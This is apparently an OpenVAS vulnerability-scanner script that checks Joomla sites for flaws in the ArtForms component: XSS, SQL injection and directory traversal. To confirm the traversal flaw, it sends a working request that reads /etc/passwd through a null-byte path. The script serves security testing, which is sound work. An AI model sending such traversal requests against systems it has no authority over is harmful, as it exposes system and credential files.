###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_artforms_mult_vuln.nasl 5794 2017-03-30 13:52:29Z cfi $
#
# Joomla! ArtForms Component Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902219");
  script_version("$Revision: 5794 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-30 15:52:29 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
  script_bugtraq_id(41457);
  script_cve_id("CVE-2010-2846", "CVE-2010-2848", "CVE-2010-2847");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla! ArtForms Component Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60162");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60161");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60160");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14263/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1007-exploits/joomlaartforms-sqltraversalxss.txt");

  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to insert arbitrary
  HTML or to execute arbitrary SQL commands or to read arbitrary files.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Joomla ArtForms version 2.1b7.2 RC2 and prior.");
  script_tag(name : "insight" , value : "The flaws are due to
  - Error in the 'ArtForms' (com_artforms) component, allows remote attackers
  to inject arbitrary web script or HTML via the 'afmsg' parameter to
  'index.php'.
  - Directory traversal error in 'assets/captcha/includes/alikon/playcode.php'
  in the InterJoomla 'ArtForms' (com_artforms) component, allows remote
  attackers to read arbitrary files via a .. (dot dot) in the 'l' parameter.
  - Multiple SQL injection errors in the 'ArtForms' (com_artforms) component,
  allows remote attackers to execute arbitrary SQL commands via the 'viewform'
  parameter in a 'ferforms' and 'tferforms' action to 'index.php', and the
  'id' parameter in a 'vferforms' action to 'index.php'.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running Joomla and is prone to multiple
  vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

jafPort = get_http_port(default:80);

foreach path (make_list_unique("/", "/Joomla150", "/joomla", cgi_dirs(port:jafPort)))
{

  if( path == "/" ) path = "";

  rcvRes = http_get_cache(item:string(path, "/index.php"), port:jafPort);

  ## Confirm application is Ad peeps
  if(">Welcome to the Frontpage</" >< rcvRes)
  {
    sndReq = http_get(item:string(path, "/index.php?option=com_artforms"),
                                  port:jafPort);
    rcvRes = http_keepalive_send_recv(port:jafPort, data:sndReq);

    ## Confirm the component
    if("ArtForms" >< rcvRes)
    {
      ver = eregmatch(string:rcvRes, pattern: "v. (([0-9.]+)(([a-zA-Z])?" +
                                     "([0-9.]+)?.?([a-zA-Z0-9.]+))?)");
      if(!isnull(ver[1])) {
       compVer = ereg_replace(pattern:"([a-z])|( )", string:ver[1], replace:".");
      }

      ## Try Exploit
      sndReq = http_get(item:string(path, "/components/com_artforms/assets/" +
                        "captcha/includes/alikon/playcode.php?l=../../../.." +
                        "/../../../../../../../../etc/passwd%00"), port:jafPort);
      rcvRes = http_keepalive_send_recv(port:jafPort, data:sndReq);

      ## Check the response to confirm vulnerability
      if("root:x:" >< rcvRes && "root:/root:" >< rcvRes)
      {
        security_message(jafPort);
        exit(0);
      }
    }
  }

  if(!isnull(compVer))
  {
    # Check for ArtForms <= 2.1b7.2 RC2
    if(version_is_less_equal(version:compVer, test_version:"2.1.7.2.RC2"))
    {
      security_message(jafPort);
      exit(0);
    }
  }
}
